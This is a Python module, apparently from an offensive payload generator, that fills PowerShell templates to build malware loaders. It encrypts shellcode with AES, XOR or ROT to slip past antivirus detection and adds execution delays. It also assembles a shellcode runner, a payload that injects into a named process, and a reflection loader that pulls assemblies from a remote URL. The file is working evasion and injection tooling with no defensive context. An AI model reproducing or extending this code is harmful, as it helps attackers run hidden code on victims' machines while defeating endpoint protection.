import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from .utils import *

path = os.path.dirname(__file__)

def bytes_to_ps(data):
    hex_bytes = [f"0x{b:02X}" for b in data]
    return ", ".join(hex_bytes)

def delay(args, code):
    if (args.delay):
        return code.replace('{{DELAY}}', str(args.delay))
    else:
        return code.replace('{{DELAY}}', '$null')

def encrypt(args, code, shellcode):
    if args.encrypt:
        if args.encrypt.upper() == 'AES':
            key = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(shellcode, AES.block_size))
            iv = cipher.iv
            return code.replace('{{ENCRYPT}}', '"AES"').replace('{{SHELLCODE}}', bytes_to_ps(ct_bytes)).replace('{{AES_KEY}}', bytes_to_ps(key)).replace('{{AES_IV}}', bytes_to_ps(iv))
        elif args.encrypt.upper() == 'XOR':
            key = int.from_bytes(os.urandom(1))
            return code.replace('{{ENCRYPT}}', '"XOR"').replace('{{SHELLCODE}}', bytes_to_ps(xor_encrypt(shellcode, key))).replace('{{XOR_KEY}}', hex(key))
        elif args.encrypt.upper() == 'ROT':
            key = int.from_bytes(os.urandom(1))
            return code.replace('{{ENCRYPT}}', '"ROT"').replace('{{SHELLCODE}}', bytes_to_ps(rot_encrypt(shellcode, key))).replace('{{ROT_KEY}}', hex(key))
    else:
        return code.replace('{{ENCRYPT}}', '$null').replace('{{SHELLCODE}}', bytes_to_ps(shellcode))

def av_bypass(args, shellcode):
    with open(os.path.join(path, 'templates/ps/av_bypass.ps1'), 'r') as f:
        code = f.read()
    payload = delay(args, code)
    payload = encrypt(args, payload, shellcode)
    return payload

def shellcode_runner(args, shellcode):
    with open(os.path.join(path, 'templates/ps/shellcode_runner.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(args, shellcode)
    return code.replace('{{PAYLOAD}}', payload)

def process_injection(args, shellcode):
    with open(os.path.join(path, 'templates/ps/process_injection.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(args, shellcode)
    process_name = os.path.splitext(os.path.basename(args.process.replace('\\','/')))[0]
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name)

def assembly_reflection(url):
    with open(os.path.join(path, 'templates/ps/assembly_reflection.ps1'), 'r') as f:
        code = f.read()
    return code.replace('{{URL}}', url)